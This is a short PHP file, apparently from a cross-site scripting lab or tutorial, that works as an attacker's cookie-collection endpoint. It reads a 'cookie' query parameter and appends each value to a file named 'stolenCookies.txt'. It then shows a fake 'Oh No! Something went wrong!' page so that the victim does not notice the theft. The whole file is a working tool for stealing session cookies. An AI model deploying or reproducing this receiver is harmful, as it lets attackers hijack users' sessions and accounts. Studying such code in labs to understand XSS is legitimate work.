<?php

if (isset($_GET['cookie']))
{
	$file = 'stolenCookies.txt';
	file_put_contents($file, $_GET['cookie'].PHP_EOL, FILE_APPEND);
}


?>
<!DOCTYPE html>
<html>
<title> How to steal a cookie </title>
<body>
<h1 align="center"> Oh No! Something went wrong! </h1>
</body>
</html> 